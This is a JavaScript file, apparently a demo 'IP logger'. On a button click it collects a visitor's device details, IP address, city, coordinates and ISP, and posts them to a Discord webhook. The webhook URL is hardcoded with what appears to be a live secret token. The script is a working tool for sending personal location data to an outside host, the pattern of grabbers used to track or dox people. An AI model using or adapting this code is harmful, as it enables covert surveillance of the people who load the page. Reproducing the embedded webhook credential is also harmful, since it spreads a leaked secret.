// --- CONFIG ---
// Replace with your own Discord webhook URL (keep it secret).
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1415394791654428856/0uncp10Lr772qmkanZ4aKAGYo63UdG9XnW32s0UA2CrXXx8ZiubzteQiBxxAgVrAvoTg";

// --- utility ---
function safeStringify(obj) {
  try { return JSON.stringify(obj, null, 2); } catch (e) { return String(obj); }
}

const statusEl = () => document.getElementById('status');
const outputEl = () => document.getElementById('output');
const btn = document.getElementById('logBtn');

// Collect local (client-side) info including device details
function collectClientInfo() {
  const client = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent || null,
    language: navigator.language || null,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    screen: (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null,
    platform: navigator.platform || null,
    deviceMemory: navigator.deviceMemory || "unknown",      // Approx RAM in GB
    cpuCores: navigator.hardwareConcurrency || "unknown",   // CPU threads
    touchSupport: navigator.maxTouchPoints || 0             // Touchscreen support
  };

  // Modern User-Agent Client Hints API (if supported)
  if (navigator.userAgentData) {
    client.userAgentData = {
      mobile: navigator.userAgentData.mobile,
      brands: navigator.userAgentData.brands
    };
  }

  return client;
}

// Fetch IP + geolocation via HTTPS API (ipapi.co)
async function fetchGeo() {
  const url = 'https://ipapi.co/json/';
  const res = await fetch(url, { cache: 'no-store' });
  if (!res.ok) throw new Error('Geo API error: ' + res.status);
  return await res.json();
}

// Send results to Discord webhook
async function sendToDiscord(payload) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('XXXX')) {
    console.warn('Discord webhook URL not set. Skipping Discord send.');
    return { skipped: true };
  }

  const body = {
    content: '```json\\n' + safeStringify(payload) + '\\n```',
    embeds: [{
      title: 'New Visitor Info (Demo)',
      color: 3447003,
      fields: [
        { name: 'IP', value: payload.ip || 'n/a', inline: true },
        { name: 'Country', value: payload.country || 'n/a', inline: true },
        { name: 'City', value: payload.city || 'n/a', inline: true },
        { name: 'Latitude', value: payload.latitude ? String(payload.latitude) : 'n/a', inline: true },
        { name: 'Longitude', value: payload.longitude ? String(payload.longitude) : 'n/a', inline: true },
        { name: 'Device RAM (GB)', value: String(payload.deviceMemory || 'n/a'), inline: true },
        { name: 'CPU Cores', value: String(payload.cpuCores || 'n/a'), inline: true },
        { name: 'Touch Support', value: String(payload.touchSupport || '0'), inline: true }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  const res = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });

  if (!res.ok) throw new Error('Discord webhook returned ' + res.status);
  return { success: true };
}

// Main flow triggered by user consent button
btn.addEventListener('click', async function() {
  btn.disabled = true;
  statusEl().textContent = 'Collecting...';

  try {
    const client = collectClientInfo();
    statusEl().textContent = 'Fetching IP & geolocation...';
    const geo = await fetchGeo();

    const full = Object.assign({}, client, {
      ip: geo.ip || null,
      city: geo.city || null,
      region: geo.region || null,
      country: geo.country_name || geo.country || null,
      latitude: geo.latitude || null,
      longitude: geo.longitude || null,
      isp: geo.org || null,
      geo_raw: geo
    });

    outputEl().textContent = safeStringify(full);
    statusEl().textContent = 'Sending to Discord (if webhook set)...';

    const sendRes = await sendToDiscord(full);
    if (sendRes && sendRes.skipped) {
      statusEl().textContent = 'Ready — webhook not configured; skipped.';
    } else {
      statusEl().textContent = 'Sent to Discord.';
    }
  } catch (err) {
    console.error(err);
    statusEl().textContent = 'Error: ' + err.message;
    outputEl().textContent = 'Error: ' + err.message;
  } finally {
    btn.disabled = false;
  }
});
